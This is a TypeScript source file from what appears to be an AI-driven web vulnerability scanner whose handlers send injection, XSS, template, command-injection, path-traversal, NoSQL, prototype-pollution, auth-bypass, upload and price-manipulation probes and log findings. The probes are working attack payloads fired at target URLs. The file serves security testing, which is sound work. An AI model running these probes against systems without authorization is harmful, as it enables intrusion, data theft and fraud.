import { AIAttackAction, AuthContext, ScanSession } from '../types';
import { httpRequest, maybeAddFinding, detectors, calculateDiff } from '../utils/scanUtils';
import { PayloadFactory } from '../services/payload/PayloadFactory';
import { responseAnalyzer } from '../services/intelligence/ResponseAnalyzer';
import { DifferentialRoleValidator } from '../services/intelligence/DifferentialRoleValidator';
import { attackLogger } from '../utils/attackLogger';

/** Deep get a field by name from a nested JSON object */
function deepGet(obj: unknown, field: string): unknown {
    if (obj === null || obj === undefined || typeof obj !== 'object') return undefined;
    const record = obj as Record<string, unknown>;
    if (field in record) return record[field];
    for (const value of Object.values(record)) {
        if (typeof value === 'object' && value !== null) {
            const found = deepGet(value, field);
            if (found !== undefined) return found;
        }
    }
    return undefined;
}

function resolveActionContext(session: ScanSession, action: AIAttackAction): AuthContext {
    const node = session.attackNodes[action.targetNodeId];
    if (node?.authContext) return node.authContext;
    return 'userA';
}

export const handlers = {
    repeat_as_guest: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const userRes = await httpRequest(session, url, 'userA');
        const guestRes = await httpRequest(session, url, 'guest');
        if (
            userRes.status === guestRes.status &&
            Math.abs(userRes.length - guestRes.length) / (userRes.length || 1) < 0.2
        ) {
            await maybeAddFinding(session, {
                type: 'bac',
                url,
                severity: 'high',
                evidence: 'Endpoint behaves similarly for authenticated user and guest; may be missing auth checks.',
                aiExplanation: action.explanation,
            });
        }
    },

    cross_role_access: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const findings = await DifferentialRoleValidator.validateCrossRoleAccess(
            session,
            url,
            action.explanation
        );

        for (const finding of findings) {
            const findingData = { ...finding } as any;
            delete findingData.id;
            await maybeAddFinding(session, findingData);
        }
    },

    sqli_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const ctx = resolveActionContext(session, action);
        // Multi-class SQLi detection with multi-signal validation.
        const basePayloads = [
            { label: 'error-based', payload: "' OR '1'='1" },
            { label: 'union-based', payload: "' UNION SELECT NULL--" },
            { label: 'boolean-blind', payload: "' AND 1=1--" },
            { label: 'time-blind', payload: "' AND SLEEP(3)--" },
        ];

        for (const { label, payload: basePayload } of basePayloads) {
            const payloads = PayloadFactory.getPayloads('sqli', basePayload, 'query_param');

            for (const payload of payloads) {
                const payloadUrl = url.includes('?')
                    ? `${url}&sqli_test=${encodeURIComponent(payload)}`
                    : `${url}?sqli_test=${encodeURIComponent(payload)}`;

                const base = await httpRequest(session, url, ctx);
                const inj = await httpRequest(session, payloadUrl, ctx);

                const analysis = responseAnalyzer.analyzeSQLi(
                    base.bodySnippet,
                    inj.bodySnippet,
                    base.status,
                    inj.status,
                    base.timeMs,
                    inj.timeMs,
                    payload,
                );

                const signalCount = analysis.signals.length;
                const hasMultiSignal = signalCount >= 2;
                const severity = analysis.errorSignature && analysis.timingAnomaly
                    ? 'critical' as const
                    : analysis.errorSignature || analysis.booleanDifference
                        ? 'high' as const
                        : 'medium' as const;

                attackLogger.log({
                    scanId: session.id,
                    endpoint: payloadUrl,
                    attackType: `sqli_${label}`,
                    method: 'GET',
                    payload,
                    responseStatus: inj.status,
                    responseTime: inj.timeMs,
                    signals: analysis.signals,
                    findingCreated: hasMultiSignal,
                    authContext: ctx,
                    rejectionReason: hasMultiSignal ? undefined : 'insufficient_signals',
                });

                if (hasMultiSignal) {
                    const diff = calculateDiff(base.bodySnippet, inj.bodySnippet);
                    const timeDelta = inj.timeMs - base.timeMs;

                    await maybeAddFinding(session, {
                        type: 'sqli',
                        url: payloadUrl,
                        severity,
                        evidence: `SQL injection detected [${label}] via ${signalCount} signals: ${analysis.signals.join(', ')}. Payload: ${payload.slice(0, 80)}`,
                        aiExplanation: action.explanation,
                        metrics: {
                            diffScore: diff,
                            timeDelta,
                            errorSignature: analysis.errorSignature ? 'sql_error' : undefined,
                        },
                    });
                    return;
                }
            }
        }
    },

    xss_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const ctx = resolveActionContext(session, action);
        // Multi-context XSS detection: HTML body, attribute, JS context, SVG
        const marker = 'XSS_TEST_123';
        const basePayloads = [
            { label: 'html-body', payload: `"><script>${marker}</script>` },
            { label: 'attribute', payload: `" onmouseover="alert('${marker}')" x="` },
            { label: 'js-context', payload: `';alert('${marker}');//` },
            { label: 'svg', payload: `<svg/onload=alert('${marker}')>` },
            { label: 'img-error', payload: `<img src=x onerror=alert('${marker}')>` },
        ];

        const baseline = await httpRequest(session, url, ctx);

        for (const { label, payload: basePayload } of basePayloads) {
            const payloads = PayloadFactory.getPayloads('xss', basePayload, 'query_param');

            for (const payload of payloads) {
                const payloadUrl = url.includes('?')
                    ? `${url}&xss_test=${encodeURIComponent(payload)}`
                    : `${url}?xss_test=${encodeURIComponent(payload)}`;

                const res = await httpRequest(session, payloadUrl, ctx);
                const analysis = responseAnalyzer.analyzeXSS(res.bodySnippet, marker);
                const hasMultiSignal = analysis.signals.length >= 2;

                attackLogger.log({
                    scanId: session.id,
                    endpoint: payloadUrl,
                    attackType: `xss_${label}`,
                    method: 'GET',
                    payload,
                    responseStatus: res.status,
                    responseTime: res.timeMs,
                    signals: analysis.signals,
                    findingCreated: hasMultiSignal,
                    authContext: ctx,
                    rejectionReason: hasMultiSignal ? undefined : 'insufficient_signals',
                });

                if (hasMultiSignal) {
                    await maybeAddFinding(session, {
                        type: 'xss',
                        url: payloadUrl,
                        severity: analysis.domSink || analysis.javascriptContext ? 'high' : 'medium',
                        evidence: `XSS detected [${label}] via ${analysis.signals.length} signals: ${analysis.signals.join(', ')}. Payload: ${payload.slice(0, 80)}`,
                        aiExplanation: action.explanation,
                        metrics: { diffScore: calculateDiff(baseline.bodySnippet, res.bodySnippet) },
                    });
                    return;
                }
            }
        }
    },

    id_tamper: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const { statefulEngine } = require('../services/workflow/StatefulAttackEngine');
        const ctx = resolveActionContext(session, action);
        const match = url.match(/(.*\/)(\d+)(\/?)$/);
        
        // Object ID Pool IDs
        const poolIds = statefulEngine.getContext(session.id)?.getAvailableObjectIds() || [];
        const uniqueFuzzIds = new Set<number>();
        
        if (match) {
            const originalId = parseInt(match[2], 10);
            uniqueFuzzIds.add(originalId - 1);
            uniqueFuzzIds.add(originalId + 1);
            uniqueFuzzIds.add(0);
            uniqueFuzzIds.add(1);
        }
        
        // Extract numeric IDs from Object ID Pool
        poolIds.forEach((id: any) => {
            if (!isNaN(parseInt(id.value, 10))) {
                uniqueFuzzIds.add(parseInt(id.value, 10));
            }
        });
        
        if (uniqueFuzzIds.size === 0) return;
        
        const prefix = match ? match[1] : (url.endsWith('/') ? url : url + '/');
        const suffix = match ? match[3] : '';

        // Get baseline response for the original URL (if possible)
        const base = await httpRequest(session, url, ctx);

        // Owner field patterns to detect in JSON responses
        const ownerFields = ['user_id', 'userId', 'owner', 'owner_id', 'ownerId',
            'email', 'username', 'user_name', 'account', 'account_id', 'author', 'author_id'];

        for (const testId of uniqueFuzzIds) {
            const tamperedUrl = `${prefix}${testId}${suffix}`;
            if (tamperedUrl === url) continue;
            
            const tampered = await httpRequest(session, tamperedUrl, ctx);

            // Skip 404s and error responses
            if (tampered.status === 404 || tampered.status >= 500) continue;

            // Check 1: Same status + similar content length = potential IDOR
            const sizeDelta = Math.abs(tampered.length - base.length) / (base.length || 1);
            const sameStatus = tampered.status === base.status;

            // Check 2: Extract and compare owner fields from JSON
            let ownerMismatch = false;
            let ownerDetail = '';
            try {
                const baseJson = JSON.parse(base.bodySnippet);
                const tamperedJson = JSON.parse(tampered.bodySnippet);

                for (const field of ownerFields) {
                    const baseVal = deepGet(baseJson, field);
                    const tamperedVal = deepGet(tamperedJson, field);
                    if (baseVal !== undefined && tamperedVal !== undefined && baseVal !== tamperedVal) {
                        ownerMismatch = true;
                        ownerDetail = `${field}: "${String(baseVal).slice(0, 30)}" → "${String(tamperedVal).slice(0, 30)}"`;
                        break;
                    }
                }
            } catch {
                // Not JSON, fall back to size comparison
            }

            if (ownerMismatch) {
                // Confirmed IDOR: different owner data returned
                await maybeAddFinding(session, {
                    type: 'idor',
                    url: tamperedUrl,
                    severity: 'critical',
                    evidence: `Confirmed IDOR: accessing ID ${testId} returned different user data. Owner field ${ownerDetail}`,
                    aiExplanation: action.explanation,
                    metrics: { diffScore: sizeDelta },
                });
                break;
            } else if (sameStatus && sizeDelta < 0.3 && tampered.status === 200) {
                // Probable IDOR: similar response for different ID
                await maybeAddFinding(session, {
                    type: 'idor',
                    url: tamperedUrl,
                    severity: 'high',
                    evidence: `Probable IDOR: accessing ID ${testId} returns similar content (size delta: ${(sizeDelta * 100).toFixed(1)}%, status: ${tampered.status}).`,
                    aiExplanation: action.explanation,
                    metrics: { diffScore: sizeDelta },
                });
                break;
            }
        }
    },

    ssti_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const ctx = resolveActionContext(session, action);
        const marker = '49';
        const payload = '{{7*7}}';
        const payloadUrl = url.includes('?')
            ? `${url}&tmpl_test=${encodeURIComponent(payload)}`
            : `${url}?tmpl_test=${encodeURIComponent(payload)}`;
        const res = await httpRequest(session, payloadUrl, ctx);
        if (res.bodySnippet.includes(marker) || detectors.templateError(res.bodySnippet)) {
            await maybeAddFinding(session, {
                type: 'ssti',
                url: payloadUrl,
                severity: 'high',
                evidence: 'Template expression output or template engine error detected.',
                aiExplanation: action.explanation,
            });
        }
    },

    csti_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        await handlers.ssti_probe(session, action, url);
    },

    rce_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const ctx = resolveActionContext(session, action);
        const payload = '$(id)';
        const payloadUrl = url.includes('?')
            ? `${url}&cmd_test=${encodeURIComponent(payload)}`
            : `${url}?cmd_test=${encodeURIComponent(payload)}`;
        const res = await httpRequest(session, payloadUrl, ctx);
        if (detectors.rceError(res.bodySnippet)) {
            await maybeAddFinding(session, {
                type: 'rce',
                url: payloadUrl,
                severity: 'critical',
                evidence: 'Command-like error output detected after sending suspicious command payload.',
                aiExplanation: action.explanation,
            });
        }
    },

    oast_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        await maybeAddFinding(session, {
            type: 'oast',
            url,
            severity: 'medium',
            evidence: 'Endpoint appears to accept external URLs or callbacks.',
            aiExplanation: action.explanation,
        });
    },

    config_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const res = await httpRequest(session, url, 'userA');
        if (detectors.configLeak(res.bodySnippet)) {
            await maybeAddFinding(session, {
                type: 'config',
                url,
                severity: 'high',
                evidence: 'Configuration or secret-like data patterns detected in response body.',
                aiExplanation: action.explanation,
            });
        }
    },

    anomaly_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const res = await httpRequest(session, url, 'userA');
        if (res.status >= 500) {
            await maybeAddFinding(session, {
                type: 'anomaly',
                url,
                severity: 'medium',
                evidence: 'Server error or abnormal response observed.',
                aiExplanation: action.explanation,
            });
        }
    },

    ssrf_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const { OASTService } = require('../services/oast/OASTService');
        const token = OASTService.generateToken();
        const callbackUrl = OASTService.getCallbackUrl(token);

        const payloadUrl = url.includes('?')
            ? `${url}&ssrf_test=${encodeURIComponent(callbackUrl)}`
            : `${url}?ssrf_test=${encodeURIComponent(callbackUrl)}`;

        await httpRequest(session, payloadUrl, 'userA');

        if (OASTService.hasInteraction(token)) {
            await maybeAddFinding(session, {
                type: 'ssrf',
                url: payloadUrl,
                severity: 'critical',
                evidence: `OAST interaction received from target for token ${token}`,
                aiExplanation: action.explanation,
            });
        }
    },

    path_traversal_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const payloads = PayloadFactory.getPayloads('lfi', '');

        for (const payload of payloads) {
            let targetUrl = url;
            if (url.includes('?')) {
                targetUrl = `${url}&file=${payload}`;
            } else {
                targetUrl = `${url}/${payload}`;
            }

            const res = await httpRequest(session, targetUrl, 'userA');

            if (
                res.bodySnippet.includes('root:x:0:0') ||
                res.bodySnippet.includes('[extensions]') ||
                res.bodySnippet.includes('drivers\\etc\\hosts')
            ) {
                await maybeAddFinding(session, {
                    type: 'lfi',
                    url: targetUrl,
                    severity: 'high',
                    evidence: `File content markers found in response: ${res.bodySnippet.slice(0, 50)}...`,
                    aiExplanation: action.explanation,
                });
                break;
            }
        }
    },

    cors_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const origin = 'https://evil.com';
        const res = await httpRequest(session, url, 'userA', {
            headers: { 'Origin': origin }
        });

        const acao = res.headers ? (res.headers['access-control-allow-origin'] || res.headers['Access-Control-Allow-Origin']) : undefined;
        const acac = res.headers ? (res.headers['access-control-allow-credentials'] || res.headers['Access-Control-Allow-Credentials']) : undefined;

        if (acao === origin && acac === 'true') {
            await maybeAddFinding(session, {
                type: 'cors',
                url,
                severity: 'high',
                evidence: `Insecure CORS configuration: Reflects Origin ${origin} and Allow-Credentials: true`,
                aiExplanation: action.explanation,
            });
        }
    },

    graphql_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const payload = '{__schema{types{name}}}';
        const payloadUrl = url.includes('?') ? `${url}&query=${encodeURIComponent(payload)}` : `${url}?query=${encodeURIComponent(payload)}`;
        const res = await httpRequest(session, payloadUrl, 'userA');

        if (res.bodySnippet.includes('__schema') && res.bodySnippet.includes('types')) {
            await maybeAddFinding(session, {
                type: 'info',
                url: payloadUrl,
                severity: 'medium',
                evidence: 'GraphQL Introspection enabled.',
                aiExplanation: action.explanation,
            });
        }
    },

    nosqli_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const payloadUrl = url.includes('?')
            ? `${url}&user[$ne]=null&password[$ne]=null`
            : `${url}?user[$ne]=null&password[$ne]=null`;

        const base = await httpRequest(session, url, 'userA');
        const inj = await httpRequest(session, payloadUrl, 'userA');

        if (base.status >= 400 && inj.status === 200) {
            await maybeAddFinding(session, {
                type: 'sqli',
                url: payloadUrl,
                severity: 'critical',
                evidence: 'NoSQL Injection bypass detected (status code change from error to success).',
                aiExplanation: action.explanation,
            });
        }
    },

    file_upload_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const filenames = PayloadFactory.getPayloads('file_upload', 'test_safe.txt', 'filename');
        const mimetypes = PayloadFactory.getPayloads('file_upload', 'text/plain', 'mimetype');

        // We will try a subset of combinations to avoid explosion
        const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';

        for (const filename of filenames) {
            // For each filename, try a benign MIME first, then a dangerous one maybe?
            // Let's stick to a safe content for now (benign string) but vary the filename and MIME.

            // Pick a mime based on extension potentially? 
            // For MVP, just try the filename with a fixed safe mime, then maybe a spoofed mime.

            // 1. Try with safe content, dangerous name
            const body = [
                `--${boundary}`,
                `Content-Disposition: form-data; name="file"; filename="${filename}"`,
                'Content-Type: text/plain',
                '',
                'Safe content for testing.',
                `--${boundary}--`
            ].join('\r\n');

            const res = await httpRequest(session, url, 'userA', {
                method: 'POST',
                data: body,
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`
                }
            });

            if (res.status === 200 && !res.bodySnippet.includes('error') && !res.bodySnippet.includes('Invalid')) {
                await maybeAddFinding(session, {
                    type: 'file_upload',
                    url,
                    severity: 'critical',
                    evidence: `File upload accepted dangerous filename: ${filename}`,
                    aiExplanation: action.explanation,
                });
                break; // Stop after first success to reduce noise
            }
        }
    },

    websocket_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Check Authenticated Upgrade
        const authRes = await httpRequest(session, url, 'userA', {
            headers: {
                'Connection': 'Upgrade',
                'Upgrade': 'websocket',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
        });

        if (authRes.status === 101) {
            // If authenticated works, check Unauthenticated
            const guestRes = await httpRequest(session, url, 'guest', {
                headers: {
                    'Connection': 'Upgrade',
                    'Upgrade': 'websocket',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13'
                }
            });

            if (guestRes.status === 101) {
                await maybeAddFinding(session, {
                    type: 'websocket',
                    url,
                    severity: 'high',
                    evidence: 'WebSocket endpoint allows unauthenticated connection upgrades (Guest access).',
                    aiExplanation: action.explanation,
                });
            } else {
                // Good, auth is enforced.
                // Maybe check for cross-role? (UserB)
                const userBRes = await httpRequest(session, url, 'userB', {
                    headers: {
                        'Connection': 'Upgrade',
                        'Upgrade': 'websocket',
                        'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                        'Sec-WebSocket-Version': '13'
                    }
                });

                if (userBRes.status === 101) {
                    await maybeAddFinding(session, {
                        type: 'websocket',
                        url,
                        severity: 'medium',
                        evidence: 'WebSocket endpoint accessible by multiple roles (UserA and UserB). Check if sensitive data is segregated.',
                        aiExplanation: action.explanation,
                    });
                }
            }
        }
    },

    csrf_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const res = await httpRequest(session, url, 'userA');

        // 1. Check Cookies for SameSite
        const setCookie = res.headers ? (res.headers['set-cookie'] || res.headers['Set-Cookie']) : undefined;
        let sensitiveCookiesWithoutSameSite = false;

        if (setCookie) {
            const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
            // Look for sensitive cookies (session, token, id) lacking SameSite=Strict or Lax
            const sensitiveNames = ['session', 'id', 'token', 'auth', 'key', 'login'];

            for (const cookie of cookies) {
                const lower = cookie.toLowerCase();
                // If cookie name looks sensitive
                if (sensitiveNames.some(n => lower.includes(n))) {
                    if (!lower.includes('samesite=strict') && !lower.includes('samesite=lax')) {
                        sensitiveCookiesWithoutSameSite = true;
                        break;
                    }
                }
            }
        }

        if (sensitiveCookiesWithoutSameSite) {
            await maybeAddFinding(session, {
                type: 'csrf',
                url,
                severity: 'medium',
                evidence: 'Sensitive cookies set without SameSite=Strict/Lax attribute.',
                aiExplanation: action.explanation,
            });
        }
    },

    clickjacking_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const res = await httpRequest(session, url, 'userA');
        const headers = res.headers || {};

        const xfo = headers['x-frame-options'] || headers['X-Frame-Options'];
        const csp = headers['content-security-policy'] || headers['Content-Security-Policy'];

        const cspMissingFrameAncestors = !csp || !csp.toLowerCase().includes('frame-ancestors');
        const xfoMissing = !xfo;

        if (xfoMissing && cspMissingFrameAncestors) {
            await maybeAddFinding(session, {
                type: 'clickjacking',
                url,
                severity: 'low',
                evidence: 'Missing X-Frame-Options and CSP frame-ancestors. Page can be framed.',
                aiExplanation: action.explanation,
            });
        }
    },

    race_condition_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const requests = [];
        for (let i = 0; i < 5; i++) {
            requests.push(httpRequest(session, url, 'userA'));
        }

        const results = await Promise.all(requests);

        const successCount = results.filter(r => r.status >= 200 && r.status < 300).length;
        if (successCount === 5) {
            const firstBody = results[0].length;
            const variance = results.some(r => Math.abs(r.length - firstBody) > 10);

            if (!variance) {
                await maybeAddFinding(session, {
                    type: 'race_condition',
                    url,
                    severity: 'medium',
                    evidence: 'Endpoint processed 5 concurrent requests with identical success responses. Potential race condition.',
                    aiExplanation: action.explanation,
                });
            }
        }
    },

    cache_deception_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const targetUrl = url.includes('?') ? url + '&nonexistent.css' : url + '/nonexistent.css';
        const res = await httpRequest(session, targetUrl, 'userA');

        const headers = res.headers || {};
        const cacheControl = headers['cache-control'] || headers['Cache-Control'] || '';
        const xCache = headers['x-cache'] || headers['X-Cache'] || '';

        const isCached = (typeof cacheControl === 'string' && cacheControl.includes('public')) ||
            (typeof xCache === 'string' && xCache.includes('HIT'));

        const sensitive = detectors.configLeak(res.bodySnippet) ||
            res.bodySnippet.includes('csrf') ||
            res.bodySnippet.includes('token');

        if (isCached && sensitive) {
            await maybeAddFinding(session, {
                type: 'cache_deception',
                url: targetUrl,
                severity: 'high',
                evidence: 'Sensitive page content returned with public caching headers when accessed with static extension.',
                aiExplanation: action.explanation,
            });
        }
    },

    proto_pollution_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const payload = '{"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted":true}}}';
        const res = await httpRequest(session, url, 'userA', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            data: payload
        });

        if (res.status === 500 || res.bodySnippet.includes('polluted')) {
            await maybeAddFinding(session, {
                type: 'proto_pollution',
                url,
                severity: 'high',
                evidence: 'Application error or reflection detected after Prototype Pollution injection.',
                aiExplanation: action.explanation,
            });
        }
    },

    graphql_deep_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const batchPayload = 'query{a:__typename b:__typename c:__typename d:__typename e:__typename}';
        const batchUrl = url.includes('?')
            ? `${url}&query=${encodeURIComponent(batchPayload)}`
            : `${url}?query=${encodeURIComponent(batchPayload)}`;

        const batchRes = await httpRequest(session, batchUrl, 'userA');

        if (batchRes.status === 200 && batchRes.bodySnippet.includes('"a":') && batchRes.bodySnippet.includes('"e":')) {
            await maybeAddFinding(session, {
                type: 'graphql_deep',
                url: batchUrl,
                severity: 'medium',
                evidence: 'GraphQL endpoint accepts query batching (alias overloading), can bypass rate limits.',
                aiExplanation: action.explanation,
            });
        }

        const deepPayload = '{__schema{types{fields{type{fields{type{name}}}}}}}';
        const deepUrl = url.includes('?')
            ? `${url}&query=${encodeURIComponent(deepPayload)}`
            : `${url}?query=${encodeURIComponent(deepPayload)}`;

        const deepRes = await httpRequest(session, deepUrl, 'userA');

        if (deepRes.status === 200 && deepRes.bodySnippet.includes('"fields":') && deepRes.length > 2000) {
            await maybeAddFinding(session, {
                type: 'graphql_deep',
                url: deepUrl,
                severity: 'low',
                evidence: 'GraphQL endpoint allows deep nested queries. Ensure complexity limits are enforced.',
                aiExplanation: action.explanation,
            });
        }
    },

    // ═══════════════════════════════════════════════════════════════════
    // Phase 8: New Attack Modules
    // ═══════════════════════════════════════════════════════════════════

    auth_bypass_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Test common authentication bypass techniques
        const techniques = [
            // 1. Remove auth headers entirely
            { name: 'no_auth', config: { headers: {} } },
            // 2. Try HTTP method switching (GET→POST, POST→GET)
            { name: 'method_switch_post', config: { method: 'POST' as const } },
            { name: 'method_switch_put', config: { method: 'PUT' as const } },
            // 3. Add X-Forwarded-For to simulate internal access
            { name: 'ip_spoof', config: { headers: { 'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1' } } },
            // 4. Try with overridden HTTP method
            { name: 'method_override', config: { headers: { 'X-HTTP-Method-Override': 'PUT' } } },
        ];

        // Get authenticated baseline
        const authRes = await httpRequest(session, url, 'userA');
        if (authRes.status >= 400) return; // Can't test bypass if auth fails normally

        for (const technique of techniques) {
            const bypassRes = await httpRequest(session, url, 'guest', technique.config);

            // Check if unauthenticated request returns similar content to authenticated
            if (
                bypassRes.status === authRes.status &&
                bypassRes.status < 400 &&
                Math.abs(bypassRes.length - authRes.length) / (authRes.length || 1) < 0.3
            ) {
                await maybeAddFinding(session, {
                    type: 'auth_bypass',
                    url,
                    severity: 'critical',
                    evidence: `Authentication bypass via ${technique.name}: unauthenticated request returns similar content (status ${bypassRes.status}).`,
                    aiExplanation: action.explanation,
                });
                break;
            }
        }
    },

    jwt_analysis_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Analyze JWT tokens found in responses
        const res = await httpRequest(session, url, 'userA');

        // Look for JWT tokens in response body and headers
        const jwtRegex = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
        const allContent = `${res.bodySnippet} ${JSON.stringify(res.headers || {})}`;
        const tokens = allContent.match(jwtRegex) || [];

        for (const token of tokens.slice(0, 3)) {
            try {
                // Decode JWT header and payload (no verification)
                const parts = token.split('.');
                const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
                const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());

                const issues: string[] = [];

                // Check for alg:none vulnerability
                if (header.alg === 'none' || header.alg === 'None') {
                    issues.push('Algorithm set to "none" — signature bypass possible');
                }

                // Check for weak algorithms
                if (header.alg === 'HS256' && !header.kid) {
                    issues.push('HS256 without key ID — may be brute-forceable');
                }

                // Check for expired tokens still being accepted
                if (payload.exp && payload.exp < Math.floor(Date.now() / 1000)) {
                    issues.push('Token is expired but was returned in response');
                }


                // Check for sensitive data in payload
                const sensitiveKeys = ['password', 'secret', 'ssn', 'credit_card', 'api_key'];
                for (const key of sensitiveKeys) {
                    if (key in payload) {
                        issues.push(`Sensitive data in JWT payload: ${key}`);
                    }
                }

                // Check for missing standard claims
                if (!payload.exp) issues.push('Missing expiration claim (exp)');
                if (!payload.iat) issues.push('Missing issued-at claim (iat)');

                if (issues.length > 0) {
                    await maybeAddFinding(session, {
                        type: 'jwt_weakness',
                        url,
                        severity: issues.some(i => i.includes('none') || i.includes('Sensitive')) ? 'critical' : 'medium',
                        evidence: `JWT weaknesses found: ${issues.join('; ')}. Algorithm: ${header.alg}`,
                        aiExplanation: action.explanation,
                    });
                }
            } catch {
                // Invalid JWT — skip
            }
        }
    },

    business_logic_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Generic business logic probe (e.g. negative quantities, unexpected steps)
        const ctx = resolveActionContext(session, action);
        
        // Example: Sending negative values in JSON body if it's a POST/PUT
        if (action.actionType === 'business_logic_probe' && action.expectedSignal) {
             const res = await httpRequest(session, url, ctx, {
                method: 'POST',
                data: JSON.stringify({ amount: -100, qty: -1, quantity: -1 }),
                headers: { 'Content-Type': 'application/json' }
             });
             
             if (res.status === 200 && !res.bodySnippet.includes('error') && !res.bodySnippet.includes('invalid')) {
                 await maybeAddFinding(session, {
                    type: 'business_logic_abuse',
                    url,
                    severity: 'high',
                    evidence: 'Endpoint processed negative quantity/amount without error.',
                    aiExplanation: action.explanation,
                 });
             }
        }
    },

    cart_manipulation_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const ctx = resolveActionContext(session, action);
        const res = await httpRequest(session, url, ctx, {
            method: 'POST',
            data: JSON.stringify({ price: 0.01, quantity: 9999 }),
            headers: { 'Content-Type': 'application/json' }
        });
        
        if (res.status === 200 && res.bodySnippet.includes('cart') && !res.bodySnippet.toLowerCase().includes('error')) {
            await maybeAddFinding(session, {
                type: 'price_manipulation',
                url,
                severity: 'critical',
                evidence: 'Cart accepted manipulated price (0.01) without validation error.',
                aiExplanation: action.explanation,
            });
        }
    },

    coupon_abuse_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const ctx = resolveActionContext(session, action);
        
        // Try applying same coupon multiple times in an array
        const res = await httpRequest(session, url, ctx, {
            method: 'POST',
            data: JSON.stringify({ coupons: ['WELCOME50', 'WELCOME50', 'WELCOME50'], coupon: ['WELCOME50', 'WELCOME50'] }),
            headers: { 'Content-Type': 'application/json' }
        });
        
        if (res.status === 200 && !res.bodySnippet.toLowerCase().includes('already applied')) {
            await maybeAddFinding(session, {
                type: 'business_logic_abuse',
                url,
                severity: 'medium',
                evidence: 'Endpoint may allow multiple applications of the same coupon via array pollution.',
                aiExplanation: action.explanation,
            });
        }
    },

    checkout_bypass_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        const ctx = resolveActionContext(session, action);
        // Direct access to checkout confirmation without cart/payment
        const res = await httpRequest(session, url, ctx, { method: 'POST' });
        
        if (res.status === 200 && res.bodySnippet.toLowerCase().includes('success')) {
            await maybeAddFinding(session, {
                type: 'business_logic_abuse',
                url,
                severity: 'critical',
                evidence: 'Checkout success page or processing endpoint accessible without required previous steps.',
                aiExplanation: action.explanation,
            });
        }
    },

    token_replay_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Capture tokens from one request and replay across endpoints
        const userARes = await httpRequest(session, url, 'userA');

        // Extract tokens from response
        const setCookie = userARes.headers?.['set-cookie'] || userARes.headers?.['Set-Cookie'] || '';
        const cookieStr = Array.isArray(setCookie) ? setCookie.join('; ') : setCookie;

        if (cookieStr) {
            // Try replaying userA's cookies as userB
            const replayRes = await httpRequest(session, url, 'userB', {
                headers: { 'Cookie': cookieStr },
            });

            // If replay returns userA's data shape with userB's identity
            if (
                replayRes.status === userARes.status &&
                replayRes.status < 400 &&
                Math.abs(replayRes.length - userARes.length) / (userARes.length || 1) < 0.2
            ) {
                await maybeAddFinding(session, {
                    type: 'token_replay',
                    url,
                    severity: 'high',
                    evidence: 'Session token replay: replaying userA cookies as userB returns similar data shape.',
                    aiExplanation: action.explanation,
                });
            }
        }
    },

    hidden_admin_probe: async (session: ScanSession, action: AIAttackAction, url: string) => {
        // Probe for common admin/management panel paths
        const origin = new URL(url).origin;
        const adminPaths = [
            '/admin', '/admin/', '/administrator', '/dashboard',
            '/wp-admin', '/wp-login.php', '/manage', '/management',
            '/control', '/cpanel', '/admin/login', '/admin/dashboard',
            '/_admin', '/backend', '/console', '/debug',
            '/api/admin', '/api/internal', '/internal',
            '/phpmyadmin', '/adminer', '/graphql',
        ];

        for (const path of adminPaths) {
            const adminUrl = `${origin}${path}`;
            const res = await httpRequest(session, adminUrl, 'guest');

            // Detect accessible admin panels (not 404/403)
            if (res.status >= 200 && res.status < 400 && res.length > 100) {
                // Verify it's not a generic redirect to homepage
                const homeRes = await httpRequest(session, origin, 'guest');
                if (Math.abs(res.length - homeRes.length) / (homeRes.length || 1) > 0.3) {
                    await maybeAddFinding(session, {
                        type: 'hidden_admin',
                        url: adminUrl,
                        severity: res.bodySnippet.includes('login') || res.bodySnippet.includes('password') ? 'high' : 'critical',
                        evidence: `Admin panel discovered at ${path} (status: ${res.status}, accessible as guest).`,
                        aiExplanation: action.explanation,
                    });
                }
            }
        }
    },

